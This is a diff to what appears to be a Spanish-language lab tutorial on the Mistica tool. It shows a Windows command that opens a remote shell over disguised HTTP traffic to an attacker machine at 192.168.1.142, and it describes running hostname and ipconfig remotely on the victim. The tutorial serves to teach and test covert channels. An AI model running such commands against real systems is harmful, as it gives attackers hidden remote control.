@@ -285,3 +285,9 @@ Cliente:
 `python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m shell:http -w "--hostname 192.168.1.142 --port 80 --header User-Agent= --success-code 404" -k key`
 
 ![image124.png]({{site.baseurl}}/images/Mistica/image124.png)
+
+Como veremos en el siguientes ejemplo, y de manera de dejar claro las prueba realizada, en el servidor, es decir, nuestro equipo atacante, nuestro Parrot, vamos a escribir los comandos hostname y un ipconfig, el cuál, mostrará información de nuestro equipo Windows.
+
+Indicamos el Servidor con io:http y el cliente, donde se ejecutará los comandos, con shell:http.
+
+![image125.png]({{site.baseurl}}/images/Mistica/image125.png)
